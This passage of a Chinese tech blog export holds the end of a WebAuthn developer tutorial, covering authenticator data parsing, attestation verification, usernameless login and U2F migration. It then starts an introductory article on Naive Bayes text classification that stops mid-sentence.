counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 